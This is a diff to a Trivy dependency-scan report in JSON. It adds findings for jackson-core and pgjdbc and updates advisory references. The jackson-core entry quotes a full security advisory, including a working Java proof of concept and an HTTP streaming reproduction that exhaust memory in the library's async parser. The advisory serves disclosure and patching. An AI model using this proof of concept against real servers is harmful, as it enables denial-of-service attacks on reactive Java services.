@@ -3,8 +3,8 @@
   "Trivy": {
     "Version": "0.69.3"
   },
-  "ReportID": "019f8446-ecab-7d9a-af40-c8a2835384e0",
-  "CreatedAt": "2026-07-21T10:44:28.459892811Z",
+  "ReportID": "019f896e-200a-7d06-876e-1759c9e88fda",
+  "CreatedAt": "2026-07-22T10:45:23.594855303Z",
   "ArtifactName": "/tmp/extracted-deps",
   "ArtifactType": "filesystem",
   "Results": [
@@ -426,6 +426,48 @@
       ],
       "Vulnerabilities": [
         {
+          "VulnerabilityID": "GHSA-r7wm-3cxj-wff9",
+          "PkgName": "com.fasterxml.jackson.core:jackson-core",
+          "PkgPath": "internal-jars/lib/liquibase-commercial.jar",
+          "PkgIdentifier": {
+            "PURL": "pkg:maven/com.fasterxml.jackson.core/jackson-core@2.18.3",
+            "UID": "6c47f02a12d2893e"
+          },
+          "InstalledVersion": "2.18.3",
+          "FixedVersion": "2.18.8, 2.21.4, 2.22.1",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-r7wm-3cxj-wff9",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Maven",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
+          },
+          "Fingerprint": "sha256:1e4cf44c1a847b14d7163f70ddf566b3db30f936fc9863049115f878a9dc43f4",
+          "Title": "jackson-core: Async parser maxNumberLength bypass via chunked digit accumulation (incomplete fix for GHSA-72hv-8253-57qq)",
+          "Description": "## Summary\n\nThe fix released in jackson-core `2.18.6` and `2.21.1` for [GHSA-72hv-8253-57qq](https://github.com/FasterXML/jackson-core/security/advisories/GHSA-72hv-8253-57qq) (Number Length Constraint Bypass in Async Parser, published 2026-02-28) is incomplete. The fix commit `b0c428e6` (#1555) wired `validateIntegerLength` into a new `_setIntLength` helper and called it at every place where the integer portion of a number is *decided* (terminator byte arrived, `.` / `e/E` seen, end-of-feed inside a fully-buffered value). It did not call it on the much more attacker-relevant path: \"ran out of input while still inside `MINOR_NUMBER_INTEGER_DIGITS`, return `NOT_AVAILABLE` to caller\".\n\nAs a result, an attacker who streams JSON to a non-blocking parser in many small chunks, without ever sending a terminator byte, can keep the parser inside `MINOR_NUMBER_INTEGER_DIGITS` indefinitely. `_textBuffer.expandCurrentSegment()` grows on every chunk, and `validateIntegerLength` is never invoked. The accumulator is only gated by `maxStringLength` (20 MiB default) — a **~20,000x amplification** of the documented `maxNumberLength` (1000 default).\n\nThis is the same vulnerability class, same advisory wording (\"Memory Exhaustion: Unbounded allocation in TextBuffer from excessively long numbers\"), same parser class — just the streaming path the original fix didn't cover. The fix to the *fraction* path is correct (see `_finishFloatFraction` at line 1834-1837 of `NonBlockingUtf8JsonParserBase.java` in 2.18.6, where `_setFractLength(fractLen)` IS called before the `NOT_AVAILABLE` return); the equivalent call is missing from every integer-digit path.\n\n## Affected versions\n\nVerified on the patched releases:\n- `com.fasterxml.jackson.core:jackson-core` **2.18.6**\n- `com.fasterxml.jackson.core:jackson-core` **2.21.1**\n\nStructurally identical code in `tools.jackson.core` 3.0.x / 3.1.x — same `NonBlockingUtf8JsonParserBase` class, same `_setIntLength` rollout, same NOT_AVAILABLE returns without validation. Not retested but presumed vulnerable.\n\n## Affected code\n\n[`src/main/java/com/fasterxml/jackson/core/json/async/NonBlockingUtf8JsonParserBase.java`](https://github.com/FasterXML/jackson-core/blob/b0c428e6/src/main/java/com/fasterxml/jackson/core/json/async/NonBlockingUtf8JsonParserBase.java) in 2.18.6 / 2.21.1.\n\n### Site 1 — `_startPositiveNumber(int ch)` lines 1320-1330:\n\n```java\nif (outPtr \u003e= outBuf.length) {\n    // NOTE: must expand to ensure contents all in a single buffer (to keep\n    // other parts of parsing simpler)\n    outBuf = _textBuffer.expandCurrentSegment();\n}\noutBuf[outPtr++] = (char) ch;\nif (++_inputPtr \u003e= _inputEnd) {\n    _minorState = MINOR_NUMBER_INTEGER_DIGITS;\n    _textBuffer.setCurrentLength(outPtr);\n    return _updateTokenToNA();          // \u003c-- no validateIntegerLength(outPtr)\n}\n```\n\n### Site 2 — `_finishNumberIntegralPart` lines 1691-1727:\n\n```java\nprotected JsonToken _finishNumberIntegralPart(char[] outBuf, int outPtr) throws IOException {\n    int negMod = _numberNegative ? -1 : 0;\n\n    while (true) {\n        if (_inputPtr \u003e= _inputEnd) {\n            _minorState = MINOR_NUMBER_INTEGER_DIGITS;\n            _textBuffer.setCurrentLength(outPtr);\n            return _updateTokenToNA();    // \u003c-- no validateIntegerLength(outPtr + negMod)\n        }\n        int ch = getByteFromBuffer(_inputPtr) \u0026 0xFF;\n        if (ch \u003c INT_0) {\n            if (ch == INT_PERIOD) {\n                _setIntLength(outPtr+negMod);   // \u003c-- validated here\n                ++_inputPtr;\n                return _startFloat(outBuf, outPtr, ch);\n            }\n            break;\n        }\n        if (ch \u003e INT_9) {\n            if ((ch | 0x20) == INT_e) {\n                _setIntLength(outPtr+negMod);   // \u003c-- validated here\n                ++_inputPtr;\n                return _startFloat(outBuf, outPtr, ch);\n            }\n            break;\n        }\n        ++_inputPtr;\n        if (outPtr \u003e= outBuf.length) {\n            outBuf = _textBuffer.expandCurrentSegment();\n        }\n        outBuf[outPtr++] = (char) ch;\n    }\n    _setIntLength(outPtr+negMod);            // \u003c-- validated here\n    _textBuffer.setCurrentLength(outPtr);\n    return _valueComplete(JsonToken.VALUE_NUMBER_INT);\n}\n```\n\nThe pattern recurs at lines 1297, 1329, 1343, 1365, 1395, 1409, 1437, 1467, 1481, 1586, 1644, 1698 — every \"ran out of input mid-integer\" exit returns to the caller without validating the accumulator length.\n\n### Compare with the fraction path that is correct\n\n`_finishFloatFraction` lines 1827-1838:\n\n```java\nwhile (loop) {\n    if (ch \u003e= INT_0 \u0026\u0026 ch \u003c= INT_9) {\n        ++fractLen;\n        if (outPtr \u003e= outBuf.length) {\n            outBuf = _textBuffer.expandCurrentSegment();\n        }\n        outBuf[outPtr++] = (char) ch;\n        if (_inputPtr \u003e= _inputEnd) {\n            _textBuffer.setCurrentLength(outPtr);\n            _setFractLength(fractLen);          // \u003c-- VALIDATED\n            return JsonToken.NOT_AVAILABLE;\n        }\n        ch = getNextSignedByteFromBuffer();\n    }\n    ...\n}\n```\n\n## Impact\n\nReactive frameworks (Spring WebFlux / Reactor, Quarkus, Helidon, Vert.x JSON, anything wrapping `JsonFactory.createNonBlockingByteArrayParser()` or `createNonBlockingByteBufferParser()`) feed inbound HTTP/gRPC bytes to the async parser as they arrive. Operators who set `StreamReadConstraints.builder().maxNumberLength(N)` on the assumption that this caps memory per number value are not getting that guarantee in chunked-feed scenarios. The parser silently accumulates digits up to `maxStringLength` (20 MiB default) per concurrent connection. Multiply by attacker-controlled concurrency to OOM the JVM.\n\nThe synchronous parsers (`UTF8StreamJsonParser`, `ReaderBasedJsonParser`) and the async parser on *complete* input are not affected — those paths go through `_setIntLength` or `ParserBase._reportTooLongIntegral` correctly.\n\nCWE-770 (Allocation of Resources Without Limits or Throttling), CVSS roughly the same as the parent advisory (Network / Low complexity / High availability impact). The parent advisory was scored CVSS 8.7 High.\n\n## Proof of concept\n\nStandalone PoC, no Maven required:\n\n```\nmkdir poc \u0026\u0026 cd poc\ncurl -sLo jackson-core-2.18.6.jar https://repo1.maven.org/maven2/com/fasterxml/jackson/core/jackson-core/2.18.6/jackson-core-2.18.6.jar\ncat \u003e PoC.java \u003c\u003c'EOF'\nimport com.fasterxml.jackson.core.*;\nimport com.fasterxml.jackson.core.async.ByteArrayFeeder;\n\npublic class PoC {\n    public static void main(String[] args) throws Exception {\n        StreamReadConstraints strict = StreamReadConstraints.builder()\n                .maxNumberLength(1000)\n                .build();\n        JsonFactory f = new JsonFactoryBuilder()\n                .streamReadConstraints(strict)\n                .build();\n\n        // Sanity: synchronous parser rejects 5000-digit int.\n        try (JsonParser p = f.createParser(\"{\\\"v\\\":\" + \"1\".repeat(5000) + \"}\")) {\n            while (p.nextToken() != null) { /* drive */ }\n            System.out.println(\"[-] BUG ABSENT: sync parser accepted\");\n            return;\n        } catch (Exception e) {\n            System.out.println(\"[+] sync parser rejected 5000-digit int: \" + e.getClass().getSimpleName());\n        }\n\n        // Bug: async parser, chunked, no terminator.\n        JsonParser ap = f.createNonBlockingByteArrayParser();\n        ByteArrayFeeder feeder = (ByteArrayFeeder) ap;\n\n        byte[] preamble = \"{\\\"v\\\":\".getBytes(\"UTF-8\");\n        feeder.feedInput(preamble, 0, preamble.length);\n        while (ap.nextToken() != JsonToken.NOT_AVAILABLE) { /* drain */ }\n\n        byte[] digits = new byte[16 * 1024];\n        for (int i = 0; i \u003c digits.length; i++) digits[i] = (byte) ('1' + (i % 9));\n\n        for (int c = 0; c \u003c 600; c++) {\n            feeder.feedInput(digits, 0, digits.length);\n            JsonToken t = ap.nextToken();\n            if (t != JsonToken.NOT_AVAILABLE) {\n                System.out.println(\"[-] unexpected token: \" + t);\n                return;\n            }\n        }\n        System.out.println(\"[+] BUG PRESENT: async parser accepted ~9.83 MB of digits with maxNumberLength=1000\");\n\n        // Closing the number now finally triggers the validator.\n        feeder.feedInput(\"}\".getBytes(\"UTF-8\"), 0, 1);\n        feeder.endOfInput();\n        try {\n            while (ap.nextToken() != null) { /* drive */ }\n        } catch (Exception e) {\n            System.out.println(\"[*] late rejection on close: \" + e.getMessage().split(\"\\n\")[0]);\n        }\n        ap.close();\n    }\n}\nEOF\njavac -cp jackson-core-2.18.6.jar PoC.java\njava -Xmx256m -cp jackson-core-2.18.6.jar:. PoC\n```\n\nObserved output against `jackson-core-2.18.6`:\n\n```\n[+] sync parser rejected 5000-digit int: StreamConstraintsException\n[+] BUG PRESENT: async parser accepted ~9.83 MB of digits with maxNumberLength=1000\n[*] late rejection on close: Number value length (9830400) exceeds the maximum allowed (1000, from `StreamReadConstraints.getMaxNumberLength()`)\n```\n\nObserved output against `jackson-core-2.21.1`: identical.\n\nThe 9.83 MB figure is purely a function of the loop bound (600 chunks * 16 KiB). The actual ceiling is `maxStringLength = 20 MiB`. With the strict policy declared as `maxNumberLength = 1000`, the parser permits **9830x** more allocation than the policy allows. With `maxStringLength` left at the default 20 MiB, an attacker can drive a single connection to 40 MiB of `char[]` heap (chars are 2 bytes each) before the validator finally fires on terminator/`endOfInput()`. Multiply by concurrent connections.\n\n## End-to-end reproduction through real HTTP\n\nSupplements the standalone PoC with a running Spring Boot WebFlux server,\ndriving the same bug through the actual reactor-netty + Jackson2JsonDecoder\nstreaming-decode path that production reactive endpoints use.\n\nSetup:\n- Spring Boot 3.3.5 starter-webflux (spring-webflux 6.1.14, reactor-netty 1.1.23)\n- jackson-databind 2.17.2, jackson-core overridden:\n  - VULN run: `com.fasterxml.jackson.core:jackson-core:2.18.7` (latest published)\n  - PATCHED run: `2.18.8-SNAPSHOT` built from the fix branch\n- JVM: OpenJDK 17.0.18\n- Server `JsonFactory` configured with `StreamReadConstraints.builder().maxNumberLength(1000).build()`\n\nEndpoint under test exposes the `Flux\u003cDataBuffer\u003e` request body directly to\n`Jackson2JsonDecoder.decode(Flux, ResolvableType, ...)` so the parser sees one\nHTTP chunk per `feedInput` (the same pattern used for any\n`@RequestBody Flux\u003c...\u003e` / streaming JSON decoder in WebFlux). A raw-socket\nHTTP/1.1 chunked client streams `{\"v\":1` then 250 chunks of 200 digit bytes\neach (50,000 digits total) at 20ms intervals, then writes the closing `}`.\n\nVULN — jackson-core 2.18.7:\n```\n[VULN-SMALLCHUNK] streamed 50000 digits across 250 chunks; server still accepting\n[VULN-SMALLCHUNK] full POST sent (50000 digits). Response:\nHTTP/1.1 200 OK\nERR after 6548ms cause=com.fasterxml.jackson.core.exc.StreamConstraintsException:\n       Number value length (50000) exceeds the maximum allowed (1000, ...)\n```\nServer-side controller trace (250 DataBuffer arrivals elided):\n```\n[ctrl] DataBuffer arrived size=6   ms=39       \u003c- '{\"v\":1'\n[ctrl] DataBuffer arrived size=200 ms=42\n...\n[ctrl] DataBuffer arrived size=199 ms=5993\n[ctrl] DataBuffer arrived size=1   ms=6518     \u003c- closing '}'\n[ctrl] ERR after 6548ms ... Number value length (50000) exceeds ...\n```\nServer held all 50,000 digit characters in `_textBuffer` for 6.5 seconds with\n`maxNumberLength=1000` declared. The validator never fires during streaming;\nit only fires at value-completion when the closing `}` arrives.\n\nPATCHED — jackson-core 2.18.8-SNAPSHOT (fix branch):\n```\n[PATCHED-SMALLCHUNK] connection broke after 2801 digits at chunk 14: [Errno 32] Broken pipe\n[PATCHED-SMALLCHUNK] DONE: digits_sent=2801 status=connection-broke-mid-stream\n```\nServer-side controller trace:\n```\n[ctrl] DataBuffer arrived size=6   ms=129\n[ctrl] DataBuffer arrived size=200 ms=142\n[ctrl] DataBuffer arrived size=200 ms=142\n[ctrl] DataBuffer arrived size=200 ms=145\n[ctrl] DataBuffer arrived size=200 ms=146\n[ctrl] DataBuffer arrived size=200 ms=147\n[ctrl] ERR after 155ms ... Number value length (1001) exceeds the maximum allowed (1000, ...)\n```\nPatched server raises `StreamConstraintsException` at 155ms after only 5\nDataBuffers, exactly when the accumulated digit count crosses\n`maxNumberLength=1000`. The connection is reset mid-stream rather than the\nparser silently consuming the rest of the attacker's payload.\n\nSide-by-side:\n\n| Build | Chunks accepted before exception | Digits buffered | Time to detection |\n|---|---|---|---|\n| jackson-core 2.18.7 | 250 (full payload) | 50,000 (50x the configured limit) | 6,548ms — only at terminator |\n| 2.18.8-SNAPSHOT (fix branch) | 5 | 1,001 | 155ms — moment threshold crossed |\n\nNote on the default `@RequestBody Mono\u003cJsonNode\u003e` path: that path cannot\ndistinguish the two builds because Spring's `decodeToMono` joins all\nDataBuffers into one before parsing. The exploitable shape is the\nstreaming-decode path (`Flux\u003cJsonNode\u003e` / `@RequestBody Flux\u003c...\u003e` /\nWebSocket / SSE / any direct `decoder.decode(Flux\u003cDataBuffer\u003e, ...)` call),\nwhich is also what `Jackson2Tokenizer` uses for any streaming JSON\ndeserialization in WebFlux and Quarkus reactive REST.\n\n## Suggested fix\n\nMirror the pattern already used in `_finishFloatFraction`. At every site that returns `_updateTokenToNA()` (or `JsonToken.NOT_AVAILABLE`) with `_minorState = MINOR_NUMBER_INTEGER_DIGITS`, call `_setIntLength(outPtr + negMod)` first. Concretely, the diff to `NonBlockingUtf8JsonParserBase.java` would be:\n\n```diff\n     protected JsonToken _finishNumberIntegralPart(char[] outBuf, int outPtr) throws IOException {\n         int negMod = _numberNegative ? -1 : 0;\n\n         while (true) {\n             if (_inputPtr \u003e= _inputEnd) {\n                 _minorState = MINOR_NUMBER_INTEGER_DIGITS;\n                 _textBuffer.setCurrentLength(outPtr);\n+                _streamReadConstraints.validateIntegerLength(outPtr + negMod);\n                 return _updateTokenToNA();\n             }\n```\n\nNote: `_setIntLength` itself can't be used as-is because it also assigns `_intLength`, and `_intLength` must not be set until the integer is truly complete (subsequent fraction handling reads `_intLength`). The minimal fix is to call only the validator, as shown.\n\nApply the same one-line insertion before each `return _updateTokenToNA();` that exits with `_minorState = MINOR_NUMBER_INTEGER_DIGITS`. The sites are listed above (12 lines total).\n\nAlternatively, a heavier refactor: also gate `_textBuffer.expandCurrentSegment()` calls inside the digit-accumulation loops on `outPtr \u003c maxNumberLength` so that the validator fires at the moment the buffer would be enlarged past the limit, rather than waiting for the next chunk boundary. Either approach is sufficient.\n\n## Credit\n\nReported by `tonghuaroot` (`tonghuaroot@gmail.com`). Variant hunt against the Feb 2026 fix for GHSA-72hv-8253-57qq.",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+              "V40Score": 8.7
+            }
+          },
+          "References": [
+            "https://github.com/FasterXML/jackson-core",
+            "https://github.com/FasterXML/jackson-core/commit/050b429804dce2a7e08f0be1b0b4c3d040fdb9cd",
+            "https://github.com/FasterXML/jackson-core/commit/4cdd529749da396cc7edf6d4a2aad41d47902641",
+            "https://github.com/FasterXML/jackson-core/commit/c5941e5aae7fd5aeac55d66933cfb82b9aabeef8",
+            "https://github.com/FasterXML/jackson-core/pull/1611",
+            "https://github.com/FasterXML/jackson-core/security/advisories/GHSA-r7wm-3cxj-wff9"
+          ],
+          "PublishedDate": "2026-07-21T21:58:53Z",
+          "LastModifiedDate": "2026-07-21T21:58:53Z"
+        },
+        {
           "VulnerabilityID": "CVE-2026-54512",
           "VendorIDs": [
             "GHSA-j3rv-43j4-c7qm"
@@ -533,6 +575,7 @@
           "References": [
             "https://access.redhat.com/errata/RHSA-2026:36839",
             "https://access.redhat.com/errata/RHSA-2026:40895",
+            "https://access.redhat.com/errata/RHSA-2026:41951",
             "https://access.redhat.com/security/cve/CVE-2026-54513",
             "https://bugzilla.redhat.com/2492010",
             "https://bugzilla.redhat.com/2492015",
@@ -550,7 +593,7 @@
             "https://www.cve.org/CVERecord?id=CVE-2026-54513"
           ],
           "PublishedDate": "2026-06-23T21:17:02.333Z",
-          "LastModifiedDate": "2026-07-17T13:18:57.98Z"
+          "LastModifiedDate": "2026-07-21T12:18:57.163Z"
         },
         {
           "VulnerabilityID": "CVE-2025-59250",
@@ -742,6 +785,71 @@
           ],
           "PublishedDate": "2026-04-29T16:16:25.427Z",
           "LastModifiedDate": "2026-07-15T02:21:26.15Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-54291",
+          "VendorIDs": [
+            "GHSA-j92g-9f8w-j867"
+          ],
+          "PkgName": "org.postgresql:postgresql",
+          "PkgPath": "internal-jars/lib/postgresql.jar",
+          "PkgIdentifier": {
+            "PURL": "pkg:maven/org.postgresql/postgresql@42.7.7",
+            "UID": "9a50bd9caf77f5d"
+          },
+          "InstalledVersion": "42.7.7",
+          "FixedVersion": "42.7.12",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-54291",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Maven",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
+          },
+          "Fingerprint": "sha256:a2910b9fb0c4cd23625c16a54135e012f867fca1d38d61a6fe94b33a7285484a",
+          "Title": "org.postgresql/postgresql: com.ongres.scram/scram-client: pgjdbc: Man-in-the-middle protection bypass via SCRAM-SHA-256-PLUS downgrade",
+          "Description": "pgjdbc is an open source postgresql JDBC Driver. In releases 42.7.4 through 42.7.11, channelBinding=require connections can be silently downgraded from SCRAM-SHA-256-PLUS with channel binding to plain SCRAM-SHA-256 without it, losing the man-in-the-middle protection the setting is meant to guarantee. An attacker who can intercept the TLS connection can trigger the downgrade with a certificate whose signature algorithm has no tls-server-end-point channel-binding hash, because the bundled com.ongres.scram:scram-client returns an empty byte array instead of failing and pgJDBC ScramAuthenticator checks only that the server advertised a PLUS mechanism, without rejecting the empty binding or checking that the negotiated mechanism uses channel binding. This issue is fixed in version 42.7.12.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-636",
+            "CWE-757"
+          ],
+          "VendorSeverity": {
+            "bitnami": 3,
+            "ghsa": 3,
+            "nvd": 2,
+            "redhat": 2
+          },
+          "CVSS": {
+            "bitnami": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:L/SA:N",
+              "V40Score": 8.2
+            },
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:L/SA:N",
+              "V40Score": 8.2
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N",
+              "V3Score": 5.9
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N",
+              "V3Score": 5.9
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-54291",
+            "https://github.com/ongres/scram/releases/tag/3.3",
+            "https://github.com/pgjdbc/pgjdbc",
+            "https://github.com/pgjdbc/pgjdbc/commit/77df98e4e66c12936ded3478a0954f6f580bad99",
+            "https://github.com/pgjdbc/pgjdbc/security/advisories/GHSA-j92g-9f8w-j867",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-54291",
+            "https://www.cve.org/CVERecord?id=CVE-2026-54291"
+          ],
+          "PublishedDate": "2026-07-06T19:17:08.407Z",
+          "LastModifiedDate": "2026-07-09T13:16:25.717Z"
         }
       ]
     },
@@ -1557,12 +1665,12 @@
             }
           },
           "References": [
-            "https://access.redhat.com/errata/RHSA-2025:9940",
+            "https://access.redhat.com/errata/RHSA-2025:13578",
             "https://access.redhat.com/security/cve/CVE-2025-47273",
             "https://bugzilla.redhat.com/2366982",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2366982",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-47273",
-            "https://errata.almalinux.org/10/ALSA-2025-9940.html",
+            "https://errata.almalinux.org/9/ALSA-2025-13578.html",
             "https://errata.rockylinux.org/RLSA-2025:10407",
             "https://github.com/pypa/advisory-database/tree/main/vulns/setuptools/PYSEC-2025-49.yaml",
             "https://github.com/pypa/setuptools",
@@ -1641,12 +1749,12 @@
             }
           },
           "References": [
-            "https://access.redhat.com/errata/RHSA-2025:9940",
+            "https://access.redhat.com/errata/RHSA-2025:13578",
             "https://access.redhat.com/security/cve/CVE-2025-47273",
             "https://bugzilla.redhat.com/2366982",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2366982",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-47273",
-            "https://errata.almalinux.org/10/ALSA-2025-9940.html",
+            "https://errata.almalinux.org/9/ALSA-2025-13578.html",
             "https://errata.rockylinux.org/RLSA-2025:10407",
             "https://github.com/pypa/advisory-database/tree/main/vulns/setuptools/PYSEC-2025-49.yaml",
             "https://github.com/pypa/setuptools",
@@ -1725,12 +1833,12 @@
             }
           },
           "References": [
-            "https://access.redhat.com/errata/RHSA-2025:9940",
+            "https://access.redhat.com/errata/RHSA-2025:13578",
             "https://access.redhat.com/security/cve/CVE-2025-47273",
             "https://bugzilla.redhat.com/2366982",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2366982",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-47273",
-            "https://errata.almalinux.org/10/ALSA-2025-9940.html",
+            "https://errata.almalinux.org/9/ALSA-2025-13578.html",
             "https://errata.rockylinux.org/RLSA-2025:10407",
             "https://github.com/pypa/advisory-database/tree/main/vulns/setuptools/PYSEC-2025-49.yaml",
             "https://github.com/pypa/setuptools",
@@ -2279,7 +2387,7 @@
             }
           },
           "References": [
-            "https://access.redhat.com/errata/RHSA-2026:1086",
+            "https://access.redhat.com/errata/RHSA-2026:1239",
             "https://access.redhat.com/security/cve/CVE-2025-66418",
             "https://bugzilla.redhat.com/2419455",
             "https://bugzilla.redhat.com/2419467",
@@ -2290,7 +2398,7 @@
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-66418",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-66471",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-21441",
-            "https://errata.almalinux.org/10/ALSA-2026-1086.html",
+            "https://errata.almalinux.org/9/ALSA-2026-1239.html",
             "https://errata.rockylinux.org/RLSA-2026:1087",
             "https://github.com/urllib3/urllib3",
             "https://github.com/urllib3/urllib3/commit/24d7b67eac89f94e11003424bcf0d8f7b72222a8",
@@ -2363,7 +2471,7 @@
             }
           },
           "References": [
-            "https://access.redhat.com/errata/RHSA-2026:1086",
+            "https://access.redhat.com/errata/RHSA-2026:1239",
             "https://access.redhat.com/security/cve/CVE-2025-66418",
             "https://bugzilla.redhat.com/2419455",
             "https://bugzilla.redhat.com/2419467",
@@ -2374,7 +2482,7 @@
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-66418",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-66471",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-21441",
-            "https://errata.almalinux.org/10/ALSA-2026-1086.html",
+            "https://errata.almalinux.org/9/ALSA-2026-1239.html",
             "https://errata.rockylinux.org/RLSA-2026:1087",
             "https://github.com/urllib3/urllib3",
             "https://github.com/urllib3/urllib3/commit/24d7b67eac89f94e11003424bcf0d8f7b72222a8",
@@ -2447,7 +2555,7 @@
             }
           },
           "References": [
-            "https://access.redhat.com/errata/RHSA-2026:1086",
+            "https://access.redhat.com/errata/RHSA-2026:1239",
             "https://access.redhat.com/security/cve/CVE-2025-66418",
             "https://bugzilla.redhat.com/2419455",
             "https://bugzilla.redhat.com/2419467",
@@ -2458,7 +2566,7 @@
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-66418",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-66471",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-21441",
-            "https://errata.almalinux.org/10/ALSA-2026-1086.html",
+            "https://errata.almalinux.org/9/ALSA-2026-1239.html",
             "https://errata.rockylinux.org/RLSA-2026:1087",
             "https://github.com/urllib3/urllib3",
             "https://github.com/urllib3/urllib3/commit/24d7b67eac89f94e11003424bcf0d8f7b72222a8",
@@ -2531,7 +2639,7 @@
             }
           },
           "References": [
-            "https://access.redhat.com/errata/RHSA-2026:1086",
+            "https://access.redhat.com/errata/RHSA-2026:1239",
             "https://access.redhat.com/security/cve/CVE-2025-66471",
             "https://bugzilla.redhat.com/2419455",
             "https://bugzilla.redhat.com/2419467",
@@ -2542,7 +2650,7 @@
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-66418",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-66471",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-21441",
-            "https://errata.almalinux.org/10/ALSA-2026-1086.html",
+            "https://errata.almalinux.org/9/ALSA-2026-1239.html",
             "https://errata.rockylinux.org/RLSA-2026:1087",
             "https://github.com/urllib3/urllib3",
             "https://github.com/urllib3/urllib3/commit/c19571de34c47de3a766541b041637ba5f716ed7",
@@ -2618,7 +2726,7 @@
             }
           },
           "References": [
-            "https://access.redhat.com/errata/RHSA-2026:1086",
+            "https://access.redhat.com/errata/RHSA-2026:1239",
             "https://access.redhat.com/security/cve/CVE-2025-66471",
             "https://bugzilla.redhat.com/2419455",
             "https://bugzilla.redhat.com/2419467",
@@ -2629,7 +2737,7 @@
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-66418",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-66471",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-21441",
-            "https://errata.almalinux.org/10/ALSA-2026-1086.html",
+            "https://errata.almalinux.org/9/ALSA-2026-1239.html",
             "https://errata.rockylinux.org/RLSA-2026:1087",
             "https://github.com/urllib3/urllib3",
             "https://github.com/urllib3/urllib3/commit/c19571de34c47de3a766541b041637ba5f716ed7",
@@ -2705,7 +2813,7 @@
             }
           },
           "References": [
-            "https://access.redhat.com/errata/RHSA-2026:1086",
+            "https://access.redhat.com/errata/RHSA-2026:1239",
             "https://access.redhat.com/security/cve/CVE-2025-66471",
             "https://bugzilla.redhat.com/2419455",
             "https://bugzilla.redhat.com/2419467",
@@ -2716,7 +2824,7 @@
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-66418",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-66471",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-21441",
-            "https://errata.almalinux.org/10/ALSA-2026-1086.html",
+            "https://errata.almalinux.org/9/ALSA-2026-1239.html",
             "https://errata.rockylinux.org/RLSA-2026:1087",
             "https://github.com/urllib3/urllib3",
             "https://github.com/urllib3/urllib3/commit/c19571de34c47de3a766541b041637ba5f716ed7",
@@ -2892,6 +3000,7 @@
             "https://access.redhat.com/errata/RHSA-2026:3884",
             "https://access.redhat.com/errata/RHSA-2026:3960",
             "https://access.redhat.com/errata/RHSA-2026:4185",
+            "https://access.redhat.com/errata/RHSA-2026:41928",
             "https://access.redhat.com/errata/RHSA-2026:4215",
             "https://access.redhat.com/errata/RHSA-2026:4271",
             "https://access.redhat.com/errata/RHSA-2026:4466",
@@ -2912,7 +3021,7 @@
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-66418",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-66471",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-21441",
-            "https://errata.almalinux.org/10/ALSA-2026-1086.html",
+            "https://errata.almalinux.org/9/ALSA-2026-1239.html",
             "https://errata.rockylinux.org/RLSA-2026:1087",
             "https://github.com/urllib3/urllib3",
             "https://github.com/urllib3/urllib3/commit/8864ac407bba8607950025e0979c4c69bc7abc7b",
@@ -2928,7 +3037,7 @@
             "https://www.cve.org/CVERecord?id=CVE-2026-21441"
           ],
           "PublishedDate": "2026-01-07T22:15:44.04Z",
-          "LastModifiedDate": "2026-07-20T12:17:57.27Z"
+          "LastModifiedDate": "2026-07-21T12:17:21.563Z"
         },
         {
           "VulnerabilityID": "CVE-2026-21441",
@@ -3086,6 +3195,7 @@
             "https://access.redhat.com/errata/RHSA-2026:3884",
             "https://access.redhat.com/errata/RHSA-2026:3960",
